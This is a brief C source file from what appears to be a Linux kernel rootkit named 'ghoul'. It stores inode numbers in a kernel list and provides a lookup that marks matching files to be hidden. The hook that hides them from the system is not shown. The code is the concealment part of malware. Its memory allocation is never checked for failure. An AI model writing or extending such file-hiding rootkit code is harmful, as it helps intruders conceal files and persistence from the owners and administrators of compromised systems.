#include <linux/kernel.h>
#include <linux/slab.h>
#include "hide.h"

LIST_HEAD(inodes_to_hide);

void hide_file_inode(unsigned long ino)
{
    struct inode_list *inode_entry;

    pr_info("ghoul: hiding inode %lu\n", ino);

    inode_entry = kmalloc(sizeof(struct inode_list), GFP_KERNEL);
    inode_entry->ino = ino;
    list_add_tail(&inode_entry->list, &inodes_to_hide);
}

int should_hide_inode(unsigned long ino)
{
    struct inode_list *entry;

    list_for_each_entry(entry, &inodes_to_hide, list) {
        if (entry->ino == ino) {
            return 1;
        }
    }
    return 0;
}